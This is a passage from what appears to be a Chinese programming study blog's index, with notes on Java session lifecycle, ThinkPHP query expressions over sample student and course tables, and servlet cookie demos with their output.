<li><p>不是同一个，但是要确保数据不丢失</p>
<ul>
<li><p>session的钝化：</p>
<ul>
<li>在服务器正常关闭之前，将session对象序列化到硬盘上</li>
</ul>
</li>
<li><p>session的活化：</p>
<ul>
<li>在服务器启动后，将session文件转化为内存中的session对象即可</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="问题3"><a href="#问题3" class="headerlink" title="问题3"></a>问题3</h3><p>关闭原因：</p>
<ol>
<li><p>服务器关闭</p>
</li>
<li><p>session对象调用方法<code>invalidate()</code></p>
</li>
<li><p>session默认失效时间为30分钟</p>
</li>
</ol>
<p>在tomcat的配置文件中web.xml可以设置session的默认失效时间，可以字节修改</p>
<h2 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h2><ol>
<li><p>session是用于存储一次会话的多次请求的数据，存在服务器端</p>
</li>
<li><p>session可以存储任意类型，任意大小的数据</p>
</li>
</ol>
<ul>
<li><p>session与cookie的区别：</p>
<ol>
<li><p>session存储数据在服务器端，cookie在客户端</p>
</li>
<li><p>session没有数据大小限制，cookie有</p>
</li>
<li><p>session数据安全，cookie相对不安全</p>
</li>
</ol>
</li>
</ul>
]]></content>
      <categories>
        <category>日常学习</category>
        <category>Java开发</category>
        <category>JavaWeb</category>
      </categories>
      <tags>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP-2020/8/4-ThinkPHP-3</title>
    <url>/2020/08/04/PHP-2020-8-4-%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="ThinkPHP"><a href="#ThinkPHP" class="headerlink" title="ThinkPHP"></a>ThinkPHP</h1><h2 id="查询表达式"><a href="#查询表达式" class="headerlink" title="查询表达式"></a>查询表达式</h2><ol>
<li><p>比较查询</p>
</li>
<li><p>区间查询</p>
</li>
<li><p>其他查询</p>
</li>
</ol>
<h3 id="比较查询"><a href="#比较查询" class="headerlink" title="比较查询"></a>比较查询</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">model</span>\<span class="title">Student</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Db</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">db</span>\<span class="title">Where</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">DataTest5</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">        $result=Db::name(<span class="string">'student'</span>)-&gt;where(<span class="string">'sno'</span>,<span class="number">18008002</span>)-&gt;select();</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> json($result);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure>
<p>运行结果<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">[&#123;<span class="attr">"sno"</span>:<span class="string">"18008002"</span>,<span class="attr">"sname"</span>:<span class="string">"张杰"</span>,<span class="attr">"ssex"</span>:<span class="literal">null</span>,<span class="attr">"sage"</span>:<span class="number">21</span>,<span class="attr">"sdept"</span>:<span class="string">"IS"</span>&#125;]</span><br></pre></td></tr></table></figure></p>
<p>再返回一下它的SQL语句<br><figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="symbol">`student`</span> <span class="keyword">WHERE</span> <span class="symbol">`sno`</span> = <span class="number">18008002</span></span><br></pre></td></tr></table></figure><br>这个是简写</p>
<p>完整的语法应该是<br><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">where</span><span class="params">(字段名，表达式，查询条件)</span></span></span><br></pre></td></tr></table></figure><br>不区分大小写</p>
<p>这里就演示一下不等于<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">model</span>\<span class="title">Student</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Db</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">db</span>\<span class="title">Where</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">DataTest5</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">        $result=Db::name(<span class="string">'student'</span>)-&gt;where(<span class="string">'sno'</span>,<span class="string">'&lt;&gt;'</span>,<span class="number">18008002</span>)-&gt;select();</span></span><br><span class="line"><span class="php"><span class="comment">//        return Db::getLastSql();</span></span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> json($result);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><br>运行结果<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">[&#123;<span class="attr">"sno"</span>:<span class="string">"18008001"</span>,<span class="attr">"sname"</span>:<span class="string">"刘昊然"</span>,<span class="attr">"ssex"</span>:<span class="literal">null</span>,<span class="attr">"sage"</span>:<span class="number">23</span>,<span class="attr">"sdept"</span>:<span class="string">"IS"</span>&#125;,&#123;<span class="attr">"sno"</span>:<span class="string">"18008003"</span>,<span class="attr">"sname"</span>:<span class="string">"西巴哥"</span>,<span class="attr">"ssex"</span>:<span class="string">"男"</span>,<span class="attr">"sage"</span>:<span class="number">20</span>,<span class="attr">"sdept"</span>:<span class="string">"IS"</span>&#125;,&#123;<span class="attr">"sno"</span>:<span class="string">"18008010"</span>,<span class="attr">"sname"</span>:<span class="string">"杨紫"</span>,<span class="attr">"ssex"</span>:<span class="literal">null</span>,<span class="attr">"sage"</span>:<span class="number">26</span>,<span class="attr">"sdept"</span>:<span class="string">"IS"</span>&#125;,&#123;<span class="attr">"sno"</span>:<span class="string">"201215121"</span>,<span class="attr">"sname"</span>:<span class="string">"李勇"</span>,<span class="attr">"ssex"</span>:<span class="string">"男"</span>,<span class="attr">"sage"</span>:<span class="number">20</span>,<span class="attr">"sdept"</span>:<span class="string">"CS"</span>&#125;,&#123;<span class="attr">"sno"</span>:<span class="string">"201215122"</span>,<span class="attr">"sname"</span>:<span class="string">"刘晨"</span>,<span class="attr">"ssex"</span>:<span class="string">"女"</span>,<span class="attr">"sage"</span>:<span class="number">19</span>,<span class="attr">"sdept"</span>:<span class="string">"CS"</span>&#125;,&#123;<span class="attr">"sno"</span>:<span class="string">"201215123"</span>,<span class="attr">"sname"</span>:<span class="string">"王敏"</span>,<span class="attr">"ssex"</span>:<span class="string">"女"</span>,<span class="attr">"sage"</span>:<span class="number">18</span>,<span class="attr">"sdept"</span>:<span class="string">"MA"</span>&#125;,&#123;<span class="attr">"sno"</span>:<span class="string">"201215124"</span>,<span class="attr">"sname"</span>:<span class="string">"宋洁"</span>,<span class="attr">"ssex"</span>:<span class="string">"女"</span>,<span class="attr">"sage"</span>:<span class="number">20</span>,<span class="attr">"sdept"</span>:<span class="string">"MA"</span>&#125;,&#123;<span class="attr">"sno"</span>:<span class="string">"201215125"</span>,<span class="attr">"sname"</span>:<span class="string">"张立"</span>,<span class="attr">"ssex"</span>:<span class="string">"男"</span>,<span class="attr">"sage"</span>:<span class="number">19</span>,<span class="attr">"sdept"</span>:<span class="string">"IS"</span>&#125;]</span><br></pre></td></tr></table></figure><br>就会把不等于18008002的其他所有的信息输出</p>
<p>SQL语句<br><figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="symbol">`student`</span> <span class="keyword">WHERE</span> <span class="symbol">`sno`</span> &lt;&gt; <span class="number">18008002</span></span><br></pre></td></tr></table></figure></p>
<h3 id="区间查询"><a href="#区间查询" class="headerlink" title="区间查询"></a>区间查询</h3><p>使用like的模糊查询</p>
<p>例如找数开头的相关学科<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">model</span>\<span class="title">Student</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Db</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">db</span>\<span class="title">Where</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">DataTest5</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">        $result=Db::name(<span class="string">'course'</span>)-&gt;where(<span class="string">'cname'</span>,<span class="string">'like'</span>,<span class="string">'数%'</span>)-&gt;select();</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> json($result);</span></span><br><span class="line"></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><br>运行结果<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">[&#123;<span class="attr">"cno"</span>:<span class="number">1</span>,<span class="attr">"cname"</span>:<span class="string">"数据库"</span>,<span class="attr">"cpno"</span>:<span class="number">5</span>,<span class="attr">"ccredit"</span>:<span class="number">4</span>&#125;,&#123;<span class="attr">"cno"</span>:<span class="number">2</span>,<span class="attr">"cname"</span>:<span class="string">"数学"</span>,<span class="attr">"cpno"</span>:<span class="literal">null</span>,<span class="attr">"ccredit"</span>:<span class="number">2</span>&#125;,&#123;<span class="attr">"cno"</span>:<span class="number">5</span>,<span class="attr">"cname"</span>:<span class="string">"数据结构"</span>,<span class="attr">"cpno"</span>:<span class="number">7</span>,<span class="attr">"ccredit"</span>:<span class="number">4</span>&#125;,&#123;<span class="attr">"cno"</span>:<span class="number">6</span>,<span class="attr">"cname"</span>:<span class="string">"数据处理"</span>,<span class="attr">"cpno"</span>:<span class="literal">null</span>,<span class="attr">"ccredit"</span>:<span class="number">2</span>&#125;]</span><br></pre></td></tr></table></figure><br>这些都是数开头的学科</p>
<p>还可以使用数组来查询多个信息<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">model</span>\<span class="title">Student</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Db</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">db</span>\<span class="title">Where</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">DataTest5</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">        $result=Db::name(<span class="string">'course'</span>)-&gt;where(<span class="string">'cname'</span>,<span class="string">'like'</span>,[<span class="string">'数%'</span>,<span class="string">'信%'</span>],<span class="string">'or'</span>)-&gt;select();</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> json($result);</span></span><br><span class="line"></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><br>运行结果<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">[&#123;<span class="attr">"cno"</span>:<span class="number">1</span>,<span class="attr">"cname"</span>:<span class="string">"数据库"</span>,<span class="attr">"cpno"</span>:<span class="number">5</span>,<span class="attr">"ccredit"</span>:<span class="number">4</span>&#125;,&#123;<span class="attr">"cno"</span>:<span class="number">2</span>,<span class="attr">"cname"</span>:<span class="string">"数学"</span>,<span class="attr">"cpno"</span>:<span class="literal">null</span>,<span class="attr">"ccredit"</span>:<span class="number">2</span>&#125;,&#123;<span class="attr">"cno"</span>:<span class="number">3</span>,<span class="attr">"cname"</span>:<span class="string">"信息系统"</span>,<span class="attr">"cpno"</span>:<span class="number">1</span>,<span class="attr">"ccredit"</span>:<span class="number">4</span>&#125;,&#123;<span class="attr">"cno"</span>:<span class="number">5</span>,<span class="attr">"cname"</span>:<span class="string">"数据结构"</span>,<span class="attr">"cpno"</span>:<span class="number">7</span>,<span class="attr">"ccredit"</span>:<span class="number">4</span>&#125;,&#123;<span class="attr">"cno"</span>:<span class="number">6</span>,<span class="attr">"cname"</span>:<span class="string">"数据处理"</span>,<span class="attr">"cpno"</span>:<span class="literal">null</span>,<span class="attr">"ccredit"</span>:<span class="number">2</span>&#125;]</span><br></pre></td></tr></table></figure><br>看到就比之前多了一个信息系统</p>
<p>官方推荐是使用快捷方式<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">model</span>\<span class="title">Student</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Db</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">db</span>\<span class="title">Where</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">DataTest5</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">        $result=Db::name(<span class="string">'course'</span>)-&gt;whereLike(<span class="string">'cname'</span>,<span class="string">'数%'</span>)-&gt;select();</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> json($result);</span></span><br><span class="line"></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><br>和之前查询的一样，还有一个whereNotLike，意思就是除了参数，其他的都返回</p>
<p>Between的区间查询<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">model</span>\<span class="title">Student</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Db</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">db</span>\<span class="title">Where</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">DataTest5</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">        $result=Db::name(<span class="string">'student'</span>)-&gt;whereBetween(<span class="string">'sno'</span>,[<span class="number">18008001</span>,<span class="number">18008003</span>])-&gt;select();</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> json($result);</span></span><br><span class="line"></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><br>运行结果<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">[&#123;<span class="attr">"sno"</span>:<span class="string">"18008001"</span>,<span class="attr">"sname"</span>:<span class="string">"刘昊然"</span>,<span class="attr">"ssex"</span>:<span class="literal">null</span>,<span class="attr">"sage"</span>:<span class="number">23</span>,<span class="attr">"sdept"</span>:<span class="string">"IS"</span>&#125;,&#123;<span class="attr">"sno"</span>:<span class="string">"18008002"</span>,<span class="attr">"sname"</span>:<span class="string">"张杰"</span>,<span class="attr">"ssex"</span>:<span class="literal">null</span>,<span class="attr">"sage"</span>:<span class="number">21</span>,<span class="attr">"sdept"</span>:<span class="string">"IS"</span>&#125;,&#123;<span class="attr">"sno"</span>:<span class="string">"18008003"</span>,<span class="attr">"sname"</span>:<span class="string">"西巴哥"</span>,<span class="attr">"ssex"</span>:<span class="string">"男"</span>,<span class="attr">"sage"</span>:<span class="number">20</span>,<span class="attr">"sdept"</span>:<span class="string">"IS"</span>&#125;]</span><br></pre></td></tr></table></figure></p>
<p>如果是whereNotBetween，很好理解，和上面的NotLike一样</p>
<h3 id="其他查询"><a href="#其他查询" class="headerlink" title="其他查询"></a>其他查询</h3><p>使用exp来自定义sql语句<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">model</span>\<span class="title">Student</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Db</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">db</span>\<span class="title">Where</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">DataTest5</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">        $result=Db::name(<span class="string">'student'</span>)-&gt;where(<span class="string">'sno'</span>,<span class="string">'exp'</span>,<span class="string">'In(18008001,18008002,18008003)'</span>)-&gt;select();</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> json($result);</span></span><br><span class="line"></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><br>运行结果<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">[&#123;<span class="attr">"sno"</span>:<span class="string">"18008001"</span>,<span class="attr">"sname"</span>:<span class="string">"刘昊然"</span>,<span class="attr">"ssex"</span>:<span class="literal">null</span>,<span class="attr">"sage"</span>:<span class="number">23</span>,<span class="attr">"sdept"</span>:<span class="string">"IS"</span>&#125;,&#123;<span class="attr">"sno"</span>:<span class="string">"18008002"</span>,<span class="attr">"sname"</span>:<span class="string">"张杰"</span>,<span class="attr">"ssex"</span>:<span class="literal">null</span>,<span class="attr">"sage"</span>:<span class="number">21</span>,<span class="attr">"sdept"</span>:<span class="string">"IS"</span>&#125;,&#123;<span class="attr">"sno"</span>:<span class="string">"18008003"</span>,<span class="attr">"sname"</span>:<span class="string">"西巴哥"</span>,<span class="attr">"ssex"</span>:<span class="string">"男"</span>,<span class="attr">"sage"</span>:<span class="number">20</span>,<span class="attr">"sdept"</span>:<span class="string">"IS"</span>&#125;]</span><br></pre></td></tr></table></figure></p>
<p>快捷模式是whereExp</p>
]]></content>
      <categories>
        <category>日常学习</category>
        <category>PHP开发</category>
        <category>ThinkPHP</category>
      </categories>
      <tags>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaWeb-2020/8/3-Cookie</title>
    <url>/2020/08/03/JavaWeb-2020-8-3-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h1><h2 id="细节"><a href="#细节" class="headerlink" title="细节"></a>细节</h2><h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><ol>
<li><p>一次可不可以发送多个Cookie?</p>
</li>
<li><p>Cookie在浏览器中保存多长时间？</p>
</li>
<li><p>Cookie能不能存中文？</p>
</li>
<li><p>Cookie共享问题？</p>
</li>
</ol>
<h4 id="问题1"><a href="#问题1" class="headerlink" title="问题1"></a>问题1</h4><p>一次可以发送多个Cookie</p>
<p>例如demo3<br><figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.itcast.cookie;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.<span class="type">ServletException</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">Cookie</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServlet</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServletRequest</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServletResponse</span>;</span><br><span class="line"><span class="keyword">import</span> java.io.<span class="type">IOException</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Cookie快速入门</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">demo3</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> void doPost(<span class="type">HttpServletRequest</span> request, <span class="type">HttpServletResponse</span> response) <span class="keyword">throws</span> <span class="type">ServletException</span>, <span class="type">IOException</span> &#123;</span><br><span class="line">        <span class="comment">//1.创建Cookie</span></span><br><span class="line">        <span class="type">Cookie</span> c1=<span class="keyword">new</span> <span class="type">Cookie</span>(<span class="string">"msg"</span>,<span class="string">"hello"</span>);</span><br><span class="line">        <span class="type">Cookie</span> c2=<span class="keyword">new</span> <span class="type">Cookie</span>(<span class="string">"name"</span>,<span class="string">"51nd0re1"</span>);</span><br><span class="line">        <span class="comment">//2.发送Coookie</span></span><br><span class="line">        response.addCookie(c1);</span><br><span class="line">        response.addCookie(c2);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> void doGet(<span class="type">HttpServletRequest</span> request, <span class="type">HttpServletResponse</span> response) <span class="keyword">throws</span> <span class="type">ServletException</span>, <span class="type">IOException</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.doPost(request, response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>再访问demo2<br><figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.itcast.cookie;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.<span class="type">ServletException</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">Cookie</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServlet</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServletRequest</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServletResponse</span>;</span><br><span class="line"><span class="keyword">import</span> java.io.<span class="type">IOException</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">demo2</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> void doPost(<span class="type">HttpServletRequest</span> request, <span class="type">HttpServletResponse</span> response) <span class="keyword">throws</span> <span class="type">ServletException</span>, <span class="type">IOException</span> &#123;</span><br><span class="line">        <span class="comment">//3.获取Cookie</span></span><br><span class="line">        <span class="type">Cookie</span>[] cs = request.getCookies();</span><br><span class="line">        <span class="comment">//遍历Cookie</span></span><br><span class="line">        <span class="keyword">if</span>(cs!=<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">Cookie</span> c : cs) &#123;</span><br><span class="line">                <span class="type">String</span> name = c.getName();</span><br><span class="line">                <span class="type">String</span> value = c.getValue();</span><br><span class="line">                <span class="type">System</span>.out.println(name +<span class="string">" : "</span>+ value);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> void doGet(<span class="type">HttpServletRequest</span> request, <span class="type">HttpServletResponse</span> response) <span class="keyword">throws</span> <span class="type">ServletException</span>, <span class="type">IOException</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.doPost(request, response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>运行结果<br><figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">JSESSIONID : <span class="type">B6EEFDF05B072898913A84B36CB94B1A</span></span><br><span class="line">msg : <span class="type">hello</span></span><br><span class="line">name : 51<span class="type">nd0re1</span></span><br><span class="line">Phpstorm-d069594e : 0<span class="type">d583fa6</span>-ad80-<span class="number">4735</span>-a385-c10cee7ee32f</span><br></pre></td></tr></table></figure><br>看到成功获取了两个Cookie</p>
<p>同时要说明的是，并不是只有访问demo2才会带着cookie，实际上访问demo1也会带着cookie，只是因为没有获取，所以控制台看不到而已</p>
<h4 id="问题2"><a href="#问题2" class="headerlink" title="问题2"></a>问题2</h4><ul>
<li><p>默认情况下，当浏览器关闭后，Cookie数据被销毁，也就是存储到浏览器的内存中</p>
</li>
<li><p>设置Cookie的生命周期，让它持久化存储</p>
<ul>
<li><p>setMaxAge(int seconds)</p>
<ol>
<li><p>正数：将Coookie数据写到硬盘的文件中，持久化存储，Cookie存活时间</p>
</li>
<li><p>负数：默认值，浏览器关闭清空</p>
</li>
<li><p>零：删除Cookie信息</p>
</li>
</ol>
</li>
</ul>
</li>
</ul>
<p>demo4<br><figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.itcast.cookie;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.<span class="type">ServletException</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">Cookie</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServlet</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServletRequest</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServletResponse</span>;</span><br><span class="line"><span class="keyword">import</span> java.io.<span class="type">IOException</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Cookie快速入门</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">demo4</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> void doPost(<span class="type">HttpServletRequest</span> request, <span class="type">HttpServletResponse</span> response) <span class="keyword">throws</span> <span class="type">ServletException</span>, <span 